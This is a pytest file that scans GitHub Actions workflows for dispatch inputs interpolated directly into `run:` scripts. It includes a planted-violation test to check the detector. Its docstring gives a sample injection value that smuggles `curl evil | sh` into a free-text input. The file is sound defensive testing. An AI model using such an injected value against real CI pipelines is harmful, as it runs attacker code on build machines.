"""Dispatch inputs reach shell steps through `env:`, never interpolated into `run:` (#537).

`${{ inputs.league }}` inside a `run:` body is pasted into the script before the shell parses
it, so a free-text value such as `nfl"; curl evil | sh; "` runs as code. Through `env:` the
value is data. The same holds for live.yml's `board` league output, which can carry an input verbatim.
"""
from __future__ import annotations

import re
from pathlib import Path

import pytest
import yaml

WORKFLOWS = Path(__file__).resolve().parents[2] / ".github" / "workflows"
TAINTED = re.compile(r"\$\{\{[^}]*\b(inputs\.|steps\.board\.outputs\.league)[^}]*\}\}")


def run_steps(path: Path):
    doc = yaml.safe_load(path.read_text())
    for job_name, job in (doc.get("jobs") or {}).items():
        for step in job.get("steps") or []:
            if "run" in step:
                yield job_name, step.get("name", "?"), step["run"]


def offenders(path: Path) -> list[str]:
    return [f"{path.name}:{job}:{name}: {m.group(0)}"
            for job, name, body in run_steps(path) for m in TAINTED.finditer(body)]


@pytest.mark.parametrize("path", sorted(WORKFLOWS.glob("*.yml")), ids=lambda p: p.name)
def test_no_input_expression_in_run(path):
    assert offenders(path) == []


def test_detector_sees_a_planted_interpolation(tmp_path):
    bad = tmp_path / "bad.yml"
    bad.write_text("jobs:\n  j:\n    steps:\n      - name: s\n        run: |\n"
                   "          L=\"${{ inputs.league }}\"\n")
    assert offenders(bad) != []
